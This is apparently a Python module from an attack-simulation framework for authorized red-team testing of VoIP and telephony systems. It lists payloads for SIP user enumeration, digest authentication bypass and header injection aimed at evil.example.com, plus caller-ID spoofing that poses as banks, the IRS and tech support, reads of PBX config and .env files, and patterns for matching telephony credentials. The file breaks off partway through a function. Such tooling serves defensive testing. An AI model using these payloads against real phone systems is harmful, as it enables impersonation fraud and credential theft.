"""
Voice Phishing (Vishing) and Telecom Security Assessment module.

Assesses telephony infrastructure security by testing VoIP endpoint
discovery, SIP registration probing, caller ID spoofing detection,
IVR system enumeration, PBX configuration exposure, RTP stream
analysis, telephony API abuse, and voicemail system access.

For AUTHORIZED red team engagements only.

MITRE ATT&CK:
  T1566.004 - Phishing: Spearphishing Voice
  T1598     - Phishing for Information
"""

from __future__ import annotations

import re
import uuid
from typing import Any

from bas.core.executor import AttackRequest, AttackResponse
from bas.core.scope import AuthorizationLevel
from bas.modules.base_module import BaseAttackModule, ModuleMetadata, ModuleResult, VulnStatus


# ---------------------------------------------------------------------------
# 1. VoIP Endpoint Discovery (35 payloads)
# ---------------------------------------------------------------------------
VOIP_DISCOVERY_PAYLOADS = [
    # SIP service discovery paths
    "VOIP_DISC:/sip",
    "VOIP_DISC:/voip",
    "VOIP_DISC:/phone",
    "VOIP_DISC:/telephony",
    "VOIP_DISC:/pbx",
    "VOIP_DISC:/asterisk",
    "VOIP_DISC:/freepbx",
    "VOIP_DISC:/3cx",
    "VOIP_DISC:/cisco-phone",
    "VOIP_DISC:/avaya",
    "VOIP_DISC:/yealink",
    # VoIP admin panels
    "VOIP_DISC:/admin/voip",
    "VOIP_DISC:/admin/pbx",
    "VOIP_DISC:/admin/sip",
    "VOIP_DISC:/freepbx/admin",
    "VOIP_DISC:/3cxphone/admin",
    "VOIP_DISC:/asterisk-gui",
    "VOIP_DISC:/vicidial",
    "VOIP_DISC:/a2billing",
    # VoIP configuration endpoints
    "VOIP_DISC:/provisioning",
    "VOIP_DISC:/phone/provisioning",
    "VOIP_DISC:/cfg",
    "VOIP_DISC:/phone-config",
    "VOIP_DISC:/.well-known/ocsn",
    # WebRTC endpoints
    "VOIP_DISC:/webrtc",
    "VOIP_DISC:/ws/sip",
    "VOIP_DISC:/wss/sip",
    "VOIP_DISC:/janus",
    "VOIP_DISC:/colibri",
    # Telephony API endpoints
    "VOIP_DISC:/api/v1/calls",
    "VOIP_DISC:/api/v1/extensions",
    "VOIP_DISC:/api/v1/voicemail",
    "VOIP_DISC:/api/telephony",
    "VOIP_DISC:/api/sip/endpoints",
    "VOIP_DISC:/api/pbx/status",
]

# ---------------------------------------------------------------------------
# 2. SIP Registration Probing (35 payloads)
# ---------------------------------------------------------------------------
SIP_REGISTRATION_PAYLOADS = [
    # SIP REGISTER method probes
    "SIP_REG:REGISTER sip:TARGET SIP/2.0",
    "SIP_REG:REGISTER sip:TARGET SIP/2.0;transport=tcp",
    "SIP_REG:REGISTER sip:TARGET SIP/2.0;transport=tls",
    # SIP OPTIONS for feature discovery
    "SIP_REG:OPTIONS sip:TARGET SIP/2.0",
    "SIP_REG:OPTIONS sip:TARGET SIP/2.0;transport=tcp",
    # SIP INVITE probing
    "SIP_REG:INVITE sip:100@TARGET SIP/2.0",
    "SIP_REG:INVITE sip:operator@TARGET SIP/2.0",
    "SIP_REG:INVITE sip:1000@TARGET SIP/2.0",
    # SIP user enumeration
    "SIP_ENUM:100",
    "SIP_ENUM:101",
    "SIP_ENUM:200",
    "SIP_ENUM:201",
    "SIP_ENUM:300",
    "SIP_ENUM:1000",
    "SIP_ENUM:1001",
    "SIP_ENUM:2000",
    "SIP_ENUM:9999",
    "SIP_ENUM:admin",
    "SIP_ENUM:operator",
    "SIP_ENUM:reception",
    "SIP_ENUM:helpdesk",
    "SIP_ENUM:voicemail",
    "SIP_ENUM:conference",
    "SIP_ENUM:ivr",
    # SIP authentication bypass
    "SIP_AUTH_BYPASS:REGISTER sip:TARGET SIP/2.0\r\nAuthorization: Digest username=\"admin\",realm=\"asterisk\",nonce=\"\",uri=\"sip:TARGET\",response=\"\"",
    "SIP_AUTH_BYPASS:REGISTER sip:TARGET SIP/2.0\r\nProxy-Authorization: Digest username=\"admin\",realm=\"\",nonce=\"\",response=\"\"",
    # SIP header injection
    "SIP_INJECT:INVITE sip:100@TARGET SIP/2.0\r\nContact: <sip:attacker@evil.example.com>",
    "SIP_INJECT:OPTIONS sip:TARGET SIP/2.0\r\nRecord-Route: <sip:evil.example.com;lr>",
    "SIP_INJECT:REGISTER sip:TARGET SIP/2.0\r\nVia: SIP/2.0/UDP evil.example.com:5060",
    # SIP digest leak
    "SIP_DIGEST:INVITE sip:100@TARGET SIP/2.0\r\nProxy-Require: digest",
    # SIP BYE/CANCEL abuse
    "SIP_ABUSE:BYE sip:100@TARGET SIP/2.0\r\nCall-ID: fake-call-id@evil.example.com",
    "SIP_ABUSE:CANCEL sip:100@TARGET SIP/2.0\r\nCall-ID: fake-call-id@evil.example.com",
    # SIP SUBSCRIBE for presence info
    "SIP_SUBSCRIBE:SUBSCRIBE sip:100@TARGET SIP/2.0\r\nEvent: presence",
    "SIP_SUBSCRIBE:SUBSCRIBE sip:TARGET SIP/2.0\r\nEvent: dialog",
    "SIP_SUBSCRIBE:SUBSCRIBE sip:TARGET SIP/2.0\r\nEvent: message-summary",
]

# ---------------------------------------------------------------------------
# 3. Caller ID Spoofing Detection (30 payloads)
# ---------------------------------------------------------------------------
CALLER_ID_SPOOF_PAYLOADS = [
    # STIR/SHAKEN verification endpoints
    "CID_SPOOF:/api/stir-shaken/verify",
    "CID_SPOOF:/api/caller-id/verify",
    "CID_SPOOF:/api/cnam/lookup",
    "CID_SPOOF:/api/caller-id/reputation",
    # Spoofed caller ID test headers
    "CID_SPOOF:P-Asserted-Identity:<sip:+15551234567@evil.example.com>",
    "CID_SPOOF:Remote-Party-ID:<sip:ceo@company.example.com>;party=calling",
    "CID_SPOOF:From:<sip:+18005551234@evil.example.com>;tag=spoofed",
    "CID_SPOOF:P-Preferred-Identity:<sip:helpdesk@company.example.com>",
    "CID_SPOOF:P-Asserted-Identity:<sip:+15559876543@evil.example.com>;STIR_BYPASS",
    # Caller ID with attestation levels
    "CID_SPOOF:Identity:ATTEST_A;info=<https://evil.example.com/cert>",
    "CID_SPOOF:Identity:ATTEST_B;info=<https://evil.example.com/cert>",
    "CID_SPOOF:Identity:ATTEST_C;info=<https://evil.example.com/cert>",
    # CNAM spoofing
    "CID_SPOOF:CNAM:COMPANY IT DEPT",
    "CID_SPOOF:CNAM:BANK SECURITY",
    "CID_SPOOF:CNAM:IRS TAX DEPT",
    "CID_SPOOF:CNAM:MICROSOFT SUPPORT",
    "CID_SPOOF:CNAM:APPLE SUPPORT",
    "CID_SPOOF:CNAM:SOCIAL SECURITY",
    # SIP Identity header verification
    "CID_SPOOF:Identity-Info:<https://evil.example.com/cert.pem>;alg=ES256",
    "CID_SPOOF:X-CID-Verification:none",
    "CID_SPOOF:X-CID-Verification:fail",
    # ANI spoofing indicators
    "CID_SPOOF:ANI:0000000000",
    "CID_SPOOF:ANI:1111111111",
    "CID_SPOOF:ANI:RESTRICTED",
    "CID_SPOOF:ANI:UNAVAILABLE",
    "CID_SPOOF:ANI:ANONYMOUS",
    # Toll-free spoofing
    "CID_SPOOF:From:<sip:+18001234567@evil.example.com>",
    "CID_SPOOF:From:<sip:+18881234567@evil.example.com>",
    "CID_SPOOF:From:<sip:+18771234567@evil.example.com>",
    "CID_SPOOF:From:<sip:+18661234567@evil.example.com>",
]

# ---------------------------------------------------------------------------
# 4. IVR System Enumeration (30 payloads)
# ---------------------------------------------------------------------------
IVR_ENUMERATION_PAYLOADS = [
    # IVR menu discovery via DTMF
    "IVR_ENUM:DTMF:0",
    "IVR_ENUM:DTMF:1",
    "IVR_ENUM:DTMF:2",
    "IVR_ENUM:DTMF:3",
    "IVR_ENUM:DTMF:4",
    "IVR_ENUM:DTMF:5",
    "IVR_ENUM:DTMF:6",
    "IVR_ENUM:DTMF:7",
    "IVR_ENUM:DTMF:8",
    "IVR_ENUM:DTMF:9",
    "IVR_ENUM:DTMF:*",
    "IVR_ENUM:DTMF:#",
    # IVR system fingerprinting paths
    "IVR_ENUM:/ivr",
    "IVR_ENUM:/ivr/menu",
    "IVR_ENUM:/api/ivr/config",
    "IVR_ENUM:/api/ivr/prompts",
    "IVR_ENUM:/api/ivr/flows",
    "IVR_ENUM:/api/auto-attendant",
    "IVR_ENUM:/api/call-flow",
    # Auto-attendant bypass sequences
    "IVR_BYPASS:DTMF:0000",
    "IVR_BYPASS:DTMF:9999",
    "IVR_BYPASS:DTMF:1234",
    "IVR_BYPASS:DTMF:**",
    "IVR_BYPASS:DTMF:##",
    "IVR_BYPASS:DTMF:*#",
    "IVR_BYPASS:DTMF:00",
    # IVR prompt extraction
    "IVR_ENUM:/sounds",
    "IVR_ENUM:/audio/prompts",
    "IVR_ENUM:/recordings",
    "IVR_ENUM:/api/recordings/list",
]

# ---------------------------------------------------------------------------
# 5. PBX Configuration Exposure (35 payloads)
# ---------------------------------------------------------------------------
PBX_CONFIG_PAYLOADS = [
    # Asterisk configuration files
    "PBX_CONFIG:/etc/asterisk/sip.conf",
    "PBX_CONFIG:/etc/asterisk/extensions.conf",
    "PBX_CONFIG:/etc/asterisk/iax.conf",
    "PBX_CONFIG:/etc/asterisk/voicemail.conf",
    "PBX_CONFIG:/etc/asterisk/manager.conf",
    "PBX_CONFIG:/etc/asterisk/pjsip.conf",
    "PBX_CONFIG:/etc/asterisk/queues.conf",
    "PBX_CONFIG:/etc/asterisk/meetme.conf",
    # FreePBX endpoints
    "PBX_CONFIG:/freepbx/admin/config.php",
    "PBX_CONFIG:/admin/config.php",
    "PBX_CONFIG:/recordings/index.php",
    "PBX_CONFIG:/panel/index.php",
    "PBX_CONFIG:/ucp/index.php",
    # 3CX endpoints
    "PBX_CONFIG:/api/SystemStatus",
    "PBX_CONFIG:/api/SystemInfo",
    "PBX_CONFIG:/webclient",
    # General PBX API endpoints
    "PBX_CONFIG:/api/pbx/config",
    "PBX_CONFIG:/api/pbx/extensions",
    "PBX_CONFIG:/api/pbx/trunks",
    "PBX_CONFIG:/api/pbx/routes",
    "PBX_CONFIG:/api/pbx/queues",
    "PBX_CONFIG:/api/pbx/recordings",
    "PBX_CONFIG:/api/pbx/cdr",
    # Dial plan exposure
    "PBX_CONFIG:/api/dialplan",
    "PBX_CONFIG:/api/dial-plan/export",
    "PBX_CONFIG:/api/outbound-routes",
    "PBX_CONFIG:/api/inbound-routes",
    # Conference bridge enumeration
    "PBX_CONFIG:/api/conferences",
    "PBX_CONFIG:/api/conference-rooms",
    "PBX_CONFIG:/api/meetme/rooms",
    "PBX_CONFIG:/api/bridges",
    # Voicemail system access
    "PBX_CONFIG:/api/voicemail",
    "PBX_CONFIG:/api/voicemail/boxes",
    "PBX_CONFIG:/api/voicemail/greetings",
    "PBX_CONFIG:/voicemail/inbox",
]

# ---------------------------------------------------------------------------
# 6. RTP/SRTP Stream Analysis (30 payloads)
# ---------------------------------------------------------------------------
RTP_ANALYSIS_PAYLOADS = [
    # RTP configuration endpoints
    "RTP_ANALYSIS:/api/rtp/config",
    "RTP_ANALYSIS:/api/rtp/stats",
    "RTP_ANALYSIS:/api/rtp/streams",
    "RTP_ANALYSIS:/api/media/stats",
    "RTP_ANALYSIS:/api/media/streams",
    # SRTP configuration checks
    "SRTP_CHECK:SRTP_DISABLED",
    "SRTP_CHECK:SRTP_OPTIONAL",
    "SRTP_CHECK:SRTP_REQUIRED",
    "SRTP_CHECK:SDES_KEY_EXCHANGE",
    "SRTP_CHECK:DTLS_SRTP",
    "SRTP_CHECK:ZRTP_AVAILABLE",
    # RTP port range probing
    "RTP_PORT:10000",
    "RTP_PORT:10002",
    "RTP_PORT:16384",
    "RTP_PORT:16386",
    "RTP_PORT:20000",
    "RTP_PORT:20002",
    "RTP_PORT:30000",
    "RTP_PORT:30002",
    # SRTP cipher strength check
    "SRTP_CIPHER:AES_CM_128_HMAC_SHA1_80",
    "SRTP_CIPHER:AES_CM_128_HMAC_SHA1_32",
    "SRTP_CIPHER:AES_256_CM_HMAC_SHA1_80",
    "SRTP_CIPHER:AES_256_CM_HMAC_SHA1_32",
    "SRTP_CIPHER:NULL_CIPHER",
    "SRTP_CIPHER:NULL_AUTH",
    # RTP header extension analysis
    "RTP_EXT:csrc-audio-level",
    "RTP_EXT:abs-send-time",
    "RTP_EXT:transport-cc",
    # RTCP feedback mechanism
    "RTCP_CHECK:/api/rtcp/stats",
    "RTCP_CHECK:/api/rtcp/feedback",
]

# ---------------------------------------------------------------------------
# 7. Telephony API Abuse (30 payloads)
# ---------------------------------------------------------------------------
TELEPHONY_API_PAYLOADS = [
    # Twilio-like API endpoints
    "TAPI_ABUSE:/api/v1/calls/initiate",
    "TAPI_ABUSE:/api/v1/sms/send",
    "TAPI_ABUSE:/api/v1/fax/send",
    "TAPI_ABUSE:/api/v2/calls",
    "TAPI_ABUSE:/api/v2/messages",
    # Click-to-call abuse
    "TAPI_ABUSE:/api/click-to-call",
    "TAPI_ABUSE:/api/callback",
    "TAPI_ABUSE:/api/dial",
    "TAPI_ABUSE:/api/originate",
    "TAPI_ABUSE:/api/call/connect",
    # Call recording endpoints
    "TAPI_ABUSE:/api/recordings",
    "TAPI_ABUSE:/api/recordings/download",
    "TAPI_ABUSE:/api/cdr/export",
    "TAPI_ABUSE:/api/call-logs",
    "TAPI_ABUSE:/api/call-history",
    # Phone number validation/lookup abuse
    "TAPI_ABUSE:/api/phone/validate",
    "TAPI_ABUSE:/api/phone/lookup",
    "TAPI_ABUSE:/api/number/info",
    "TAPI_ABUSE:/api/cnam/query",
    "TAPI_ABUSE:/api/carrier/lookup",
    # Telephony credential exposure
    "TAPI_CRED:/api/twilio/config",
    "TAPI_CRED:/api/vonage/config",
    "TAPI_CRED:/api/plivo/config",
    "TAPI_CRED:/.env",
    "TAPI_CRED:/config/telephony.yml",
    "TAPI_CRED:/config/voip.json",
    # WebSocket telephony endpoints
    "TAPI_ABUSE:/ws/phone",
    "TAPI_ABUSE:/ws/call",
    "TAPI_ABUSE:/ws/dialer",
    "TAPI_ABUSE:/socket.io/phone",
]

# ---------------------------------------------------------------------------
# Patterns for response analysis
# ---------------------------------------------------------------------------
VOIP_SERVICE_INDICATORS = [
    "asterisk", "freepbx", "3cx", "cisco", "avaya", "yealink",
    "polycom", "grandstream", "sipxecs", "kamailio", "opensips",
    "freeswitch", "vicidial", "elastix", "issabel", "sangoma",
    "mitel", "nec", "panasonic", "unify", "genesys",
]

PBX_CONFIG_INDICATORS = [
    "sip.conf", "extensions.conf", "pjsip.conf", "voicemail.conf",
    "manager.conf", "dialplan", "trunk", "extension", "route",
    "secret=", "password=", "context=", "callerid=",
    "register =>", "peer", "type=friend", "type=peer",
]

SIP_RESPONSE_INDICATORS = [
    "sip/2.0", "via:", "from:", "to:", "call-id:", "cseq:",
    "contact:", "user-agent:", "server:", "allow:", "supported:",
    "www-authenticate:", "proxy-authenticate:",
]

TELEPHONY_CRED_INDICATORS = [
    "twilio_account_sid", "twilio_auth_token", "twilio_api_key",
    "vonage_api_key", "vonage_api_secret", "nexmo_api",
    "plivo_auth_id", "plivo_auth_token", "bandwidth_api",
    "sip_password", "sip_secret", "ami_password",
]


class VishingSimModule(BaseAttackModule):
    """
    Voice phishing (vishing) and telecom security assessment module.

    Assesses telephony infrastructure resilience by testing:
    - VoIP endpoint discovery and service fingerprinting
    - SIP registration probing and user enumeration
    - Caller ID spoofing detection capabilities
    - IVR system enumeration and auto-attendant bypass
    - PBX configuration exposure and dial plan leakage
    - RTP/SRTP stream security and encryption checks
    - Telephony API abuse and credential exposure
    - Voicemail system access and conference bridge enumeration

    Requires AuthorizationLevel.FULL -- active telephony probing tests.
    """

    @property
    def metadata(self) -> ModuleMetadata:
        return ModuleMetadata(
            name="vishing_sim",
            description=(
                "Voice phishing simulation - VoIP discovery, SIP probing, "
                "caller ID spoofing, IVR enumeration, PBX config exposure, "
                "RTP/SRTP analysis, telephony API abuse"
            ),
            category="social_engineering",
            mitre_technique_ids=["T1566.004", "T1598"],
            mitre_technique_names=[
                "Phishing: Spearphishing Voice",
                "Phishing for Information",
            ],
            auth_level_required=AuthorizationLevel.FULL,
            owasp_category="A05:2021 - Security Misconfiguration",
            cwe_ids=["CWE-200", "CWE-284", "CWE-319"],
            tags=[
                "vishing", "voip", "sip", "telephony", "pbx", "ivr",
                "caller_id", "rtp", "srtp", "social_engineering",
            ],
        )

    # ------------------------------------------------------------------
    # Payload generation
    # ------------------------------------------------------------------

    async def _get_payloads(self, target: str, options: dict[str, Any]) -> list[str]:
        """
        Return 220+ payloads across all vishing/telecom categories.

        Options:
            categories (list[str]): limit to specific categories
        """
        if self._payload_db:
            db_payloads = await self._payload_db.get_payloads("vishing_sim", limit=300)
            if db_payloads:
                return db_payloads

        selected = options.get("categories", [])
        payloads: list[str] = []

        if not selected or "voip_discovery" in selected:
            payloads.extend(VOIP_DISCOVERY_PAYLOADS)

        if not selected or "sip_registration" in selected:
            payloads.extend(SIP_REGISTRATION_PAYLOADS)

        if not selected or "caller_id_spoof" in selected:
            payloads.extend(CALLER_ID_SPOOF_PAYLOADS)

        if not selected or "ivr_enumeration" in selected:
            payloads.extend(IVR_ENUMERATION_PAYLOADS)

        if not selected or "pbx_config" in selected:
            payloads.extend(PBX_CONFIG_PAYLOADS)

        if not selected or "rtp_analysis" in selected:
            payloads.extend(RTP_ANALYSIS_PAYLOADS)

        if not selected or "telephony_api" in selected:
            payloads.extend(TELEPHONY_API_PAYLOADS)

        return payloads

    # ------------------------------------------------------------------
    # Request building
    # ------------------------------------------------------------------

    def _build_requests(
        self, target: str, payloads: list[str], options: dict[str, Any],
    ) -> list[AttackRequest]:
        """
        Construct requests from vishing simulation payloads.

        Routes each payload category to the appropriate request builder.
        """
        requests: list[AttackRequest] = []
        auth_headers = options.get("auth_headers", {})

        for payload in payloads:
            parts = payload.split(":", 1)
            category = parts[0] if len(parts) == 2 else "UNKNOWN"
            value = parts[1] if len(parts) == 2 else payload
            req_id = str(uuid.uuid4())[:8]

            if category == "VOIP_DISC":
                requests.append(self._build_voip_discovery_request(
                    req_id, target, value, payload, auth_headers,
                ))

            elif category in ("SIP_REG", "SIP_ENUM", "SIP_AUTH_BYPASS",
                              "SIP_INJECT", "SIP_DIGEST", "SIP_ABUSE",
                              "SIP_SUBSCRIBE"):
                requests.append(self._build_sip_request(
                    req_id, target, value, payload, category, auth_headers,
                ))

            elif category == "CID_SPOOF":
                requests.append(self._build_caller_id_request(
                    req_id, target, value, payload, auth_headers,
                ))

            elif category in ("IVR_ENUM", "IVR_BYPASS"):
                requests.append(self._build_ivr_request(
                    req_id, target, value, payload, category, auth_headers,
                ))

            elif category == "PBX_CONFIG":
                requests.append(self._build_pbx_config_request(
                    req_id, target, value, payload, auth_headers,
                ))

            elif category in ("RTP_ANALYSIS", "SRTP_CHECK", "RTP_PORT",
                              "SRTP_CIPHER", "RTP_EXT", "RTCP_CHECK"):
                requests.append(self._build_rtp_request(
                    req_id, target, value, payload, category, auth_headers,
                ))

            elif category in ("TAPI_ABUSE", "TAPI_CRED"):
                requests.append(self._build_telephony_api_request(
                    req_id, target, value, payload, category, auth_headers,
                ))

            else:
                requests.append(AttackRequest(
                    request_id=f"vish-{req_id}",
                    target=target,
                    method="GET",
                    path="/",
                    headers={
                        **auth_headers,
                        "X-BAS-Attack-Type": category,
                        "X-BAS-Payload": payload,
                    },
                ))

        return requests

    # --- Individual request builders -----------------------------------------------

    def _build_voip_discovery_request(
        self, req_id: str, target: str, value: str, payload: str,
        auth_headers: dict[str, str],
    ) -> AttackRequest:
        return AttackRequest(
            request_id=f"vish-disc-{req_id}",
            target=target,
            method="GET",
            path=value,
            headers={
                **auth_headers,
                "X-BAS-Attack-Type": "VOIP_DISC",
                "X-BAS-Payload": payload,
                "User-Agent": (
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                    "AppleWebKit/537.36 (KHTML, like Gecko) "
                    "Chrome/120.0.0.0 Safari/537.36"
                ),
            },
            follow_redirects=True,
        )

    def _build_sip_request(
        self, req_id: str, target: str, value: str, payload: str,
        category: str, auth_headers: dict[str, str],
    ) -> AttackRequest:
        """Build SIP-related test requests routed through HTTP."""
        if category == "SIP_ENUM":
            # Enumerate SIP user by probing extension endpoint
            return AttackRequest(
                request_id=f"vish-sip-{req_id}",
                target=target,
                method="GET",
                path=f"/api/sip/extensions/{value}",
                headers={
                    **auth_headers,
                    "X-BAS-Attack-Type": category,
                    "X-BAS-Payload": payload,
                    "X-BAS-SIP-Extension": value,
                },
            )
        # Other SIP probes sent as POST with SIP message in body
        return AttackRequest(
            request_id=f"vish-sip-{req_id}",
            target=target,
            method="POST",
            path="/api/sip/proxy",
            body=value.replace("TARGET", target),
            content_type="application/sdp",
            headers={
                **auth_headers,
                "X-BAS-Attack-Type": category,
                "X-BAS-Payload": payload,
            },
        )

    def _build_caller_id_request(
        self, req_id: str, target: str, value: str, payload: str,
        auth_headers: dict[str, str],
    ) -> AttackRequest:
        """Test caller ID spoofing detection via API endpoints."""
        if value.startswith("/"):
            return AttackRequest(
                request_id=f"vish-cid-{req_id}",
                target=target,
                method="POST",
                path=value,
                body="caller_id=+15551234567&spoof_test=true",
                content_type="application/x-www-form-urlencoded",
                headers={
                    **auth_headers,
                    "X-BAS-Attack-Type": "CID_SPOOF",
                    "X-BAS-Payload": payload,
                },
            )
        # Header-based caller ID tests
        header_name = value.split(":")[0] if ":" in value else "X-BAS-CID-Test"
        header_value = value.split(":", 1)[1] if ":" in value else value
        return AttackRequest(
            request_id=f"vish-cid-{req_id}",
            target=target,
            method="POST",
            path="/api/sip/proxy",
            body=f"INVITE sip:100@{target} SIP/2.0\r\n{header_name}:{header_value}",
            content_type="application/sdp",
            headers={
                **auth_headers,
                "X-BAS-Attack-Type": "CID_SPOOF",
                "X-BAS-Payload": payload,
                "X-BAS-Spoof-Header": f"{header_name}:{header_value}",
            },
        )

    def _build_ivr_request(
        self, req_id: str, target: str, value: str, payload: str,
        category: str, auth_headers: dict[str, str],
    ) -> AttackRequest:
        """Test IVR system enumeration and auto-attendant bypass."""
        if value.startswith("/"):
            return AttackRequest(
                request_id=f"vish-ivr-{req_id}",
                target=target,
                method="GET",
                path=value,
                headers={
                    **auth_headers,
                    "X-BAS-Attack-Type": category,
                    "X-BAS-Payload": payload,
                },
                follow_redirects=True,
            )
        # DTMF-based IVR tests via API
        dtmf_value = value.split(":")[-1] if ":" in value else value
        return AttackRequest(
            request_id=f"vish-ivr-{req_id}",
            target=target,
            method="POST",
            path="/api/ivr/dtmf",
            body=f"digits={dtmf_value}&channel=test-{req_id}",
            content_type="application/x-www-form-urlencoded",
            headers={
                **auth_headers,
                "X-BAS-Attack-Type": category,
                "X-BAS-Payload": payload,
                "X-BAS-DTMF": dtmf_value,
            },
        )

    def _build_pbx_config_request(
        self, req_id: str, target: str, value: str, payload: str,
        auth_headers: dict[str, str],
    ) -> AttackRequest:
        return AttackRequest(
            request_id=f"vish-pbx-{req_id}",
            target=target,
            method="GET",
            path=value,
            headers={
                **auth_headers,
                "X-BAS-Attack-Type": "PBX_CONFIG",
                "X-BAS-Payload": payload,
            },
            follow_redirects=True,
        )

    def _build_rtp_request(
        self, req_id: str, target: str, value: str, payload: str,
        category: str, auth_headers: dict[str, str],
    ) -> AttackRequest:
        """Test RTP/SRTP configuration via API endpoints."""
        if value.startswith("/"):
            return AttackRequest(
                request_id=f"vish-rtp-{req_id}",
                target=target,
                method="GET",
                path=value,
                headers={
                    **auth_headers,
                    "X-BAS-Attack-Type": category,
                    "X-BAS-Payload": payload,
                },
            )
        return AttackRequest(
            request_id=f"vish-rtp-{req_id}",
            target=target,
            method="GET",
            path="/api/rtp/config",
            headers={
                **auth_headers,
                "X-BAS-Attack-Type": category,
                "X-BAS-Payload": payload,
                "X-BAS-RTP-Check": value,
            },
        )

    def _build_telephony_api_request(
        self, req_id: str, target: str, value: str, payload: str,
        category: str, auth_headers: dict[str, str],
    ) -> AttackRequest:
        """Test telephony API endpoints for abuse and credential exposure."""
        if value.startswith("/"):
            # Determine method based on endpoint purpose
            is_action = any(kw in value for kw in [
                "initiate", "send", "dial", "originate", "connect",
                "callback", "click-to-call",
            ])
            method = "POST" if is_action else "GET"
            body = (
                "from=+15551234567&to=+15559876543&message=BAS+Test"
                if method == "POST" else None
            )
            return AttackRequest(
                request_id=f"vish-api-{req_id}",
                target=target,
                method=method,
                path=value,
                body=body,
                content_type="application/x-www-form-urlencoded" if body else "text/plain",
                headers={
                    **auth_headers,
                    "X-BAS-Attack-Type": category,
                    "X-BAS-Payload": payload,
                },
            )
        return AttackRequest(
            request_id=f"vish-api-{req_id}",
            target=target,
            method="GET",
            path=value if value.startswith("/") else "/",
            headers={
                **auth_headers,
                "X-BAS-Attack-Type": category,
                "X-BAS-Payload": payload,
            },
        )

    # ------------------------------------------------------------------
    # Response analysis
    # ------------------------------------------------------------------

    def _analyze_response(
        self, request: AttackRequest, response: AttackResponse, payload: str,
    ) -> ModuleResult:
        """Analyze response for telephony/vishing vulnerability indicators."""
        attack_type = request.headers.get("X-BAS-Attack-Type", "UNKNOWN")

        # Handle errors
        if response.error == "timeout":
            return ModuleResult(
                module_name="vishing_sim",
                target=request.target,
                status=VulnStatus.TIMEOUT,
                payload_used=payload,
                response_code=response.status_code,
                elapsed_ms=response.elapsed_ms,
                detail={"attack_type": attack_type},
            )

        if response.error:
            return ModuleResult(
                module_name="vishing_sim",
                target=request.target,
                status=VulnStatus.ERROR,
                payload_used=payload,
                response_code=response.status_code,
                elapsed_ms=response.elapsed_ms,
                detail={"attack_type": attack_type, "error": response.error},
            )

        # Route to category-specific analyzer
        if attack_type == "VOIP_DISC":
            return self._analyze_voip_discovery(request, response, payload)
        elif attack_type in ("SIP_REG", "SIP_ENUM", "SIP_AUTH_BYPASS",
                             "SIP_INJECT", "SIP_DIGEST", "SIP_ABUSE",
                             "SIP_SUBSCRIBE"):
            return self._analyze_sip(request, response, payload, attack_type)
        elif attack_type == "CID_SPOOF":
            return self._analyze_caller_id(request, response, payload)
        elif attack_type in ("IVR_ENUM", "IVR_BYPASS"):
            return self._analyze_ivr(request, response, payload, attack_type)
        elif attack_type == "PBX_CONFIG":
            return self._analyze_pbx_config(request, response, payload)
        elif attack_type in ("RTP_ANALYSIS", "SRTP_CHECK", "RTP_PORT",
                             "SRTP_CIPHER", "RTP_EXT", "RTCP_CHECK"):
            return self._analyze_rtp(request, response, payload, attack_type)
        elif attack_type in ("TAPI_ABUSE", "TAPI_CRED"):
            return self._analyze_telephony_api(request, response, payload, attack_type)
        else:
            return ModuleResult(
                module_name="vishing_sim",
                target=request.target,
                status=VulnStatus.NOT_VULNERABLE,
                payload_used=payload,
                response_code=response.status_code,
                elapsed_ms=response.elapsed_ms,
                detail={"attack_type": attack_type},
            )

    # --- Category-specific analyzers -----------------------------------------------

    def _analyze_voip_discovery(
        self, request: AttackRequest, response: AttackResponse, payload: str,
    ) -> ModuleResult:
        body_lower = response.body_text.lower()

        if response.status_code not in (200, 301, 302):
            return ModuleResult(
                module_name="vishing_sim", target=request.target,
                status=VulnStatus.NOT_VULNERABLE, payload_used=payload,
                response_code=response.status_code, elapsed_ms=response.elapsed_ms,
                detail={"attack_type": "VOIP_DISC"},
            )

        # Detect VoIP service indicators
        detected_services = [
            svc for svc in VOIP_SERVICE_INDICATORS if svc in body_lower
        ]

        if detected_services:
            return ModuleResult(
                module_name="vishing_sim", target=request.target,
                status=VulnStatus.POTENTIALLY_VULNERABLE, payload_used=payload,
                response_code=response.status_code,
                response_body_preview=response.body_text[:500],
                elapsed_ms=response.elapsed_ms,
                evidence=(
                    f"VoIP service detected at {request.path}: "
                    f"{', '.join(detected_services)}"
                ),
                severity="medium", mitre_technique_id="T1598",
                detail={
                    "attack_type": "VOIP_DISC",
                    "services": detected_services,
                    "path": request.path,
                },
            )

        # Check for login forms or admin panels
        has_login = bool(re.search(r'<input[^>]*type=["\']password["\']', response.body_text, re.I))
        if has_login:
            return ModuleResult(
                module_name="vishing_sim", target=request.target,
                status=VulnStatus.POTENTIALLY_VULNERABLE, payload_used=payload,
                response_code=response.status_code,
                response_body_preview=response.body_text[:500],
                elapsed_ms=response.elapsed_ms,
                evidence=f"VoIP/PBX admin panel found at {request.path}",
                severity="medium", mitre_technique_id="T1598",
                detail={"attack_type": "VOIP_DISC", "admin_panel": True},
            )

        # Check for API responses with telephony data
        telephony_keywords = [
            "extension", "sip_uri", "dial_plan", "trunk",
            "voicemail", "call_queue", "ring_group",
        ]
        has_api_data = any(kw in body_lower for kw in telephony_keywords)

        if has_api_data:
            return ModuleResult(
                module_name="vishing_sim", target=request.target,
                status=VulnStatus.POTENTIALLY_VULNERABLE, payload_used=payload,
                response_code=response.status_code,
                response_body_preview=response.body_text[:500],
                elapsed_ms=response.elapsed_ms,
                evidence=f"Telephony API endpoint found at {request.path} exposing configuration data",
                severity="medium", mitre_technique_id="T1598",
                detail={"attack_type": "VOIP_DISC", "api_exposed": True},
            )

        return ModuleResult(
            module_name="vishing_sim", target=request.target,
            status=VulnStatus.NOT_VULNERABLE, payload_used=payload,
            response_code=response.status_code, elapsed_ms=response.elapsed_ms,
            detail={"attack_type": "VOIP_DISC"},
        )

    def _analyze_sip(
        self, request: AttackRequest, response: AttackResponse, payload: str,
        attack_type: str,
    ) -> ModuleResult:
        body_lower = response.body_text.lower()

        # Check for SIP response indicators
        has_sip_response = any(ind in body_lower for ind in SIP_RESPONSE_INDICATORS)

        if attack_type == "SIP_ENUM":
            ext = request.headers.get("X-BAS-SIP-Extension", "")
            if response.status_code == 200:
                return ModuleResult(
                    module_name="vishing_sim", target=request.target,
                    status=VulnStatus.VULNERABLE, payload_used=payload,
                    response_code=response.status_code,
                    response_body_preview=response.body_text[:500],
                    elapsed_ms=response.elapsed_ms,
                    evidence=f"SIP extension '{ext}' exists - user enumeration possible",
                    severity="medium", mitre_technique_id="T1598",
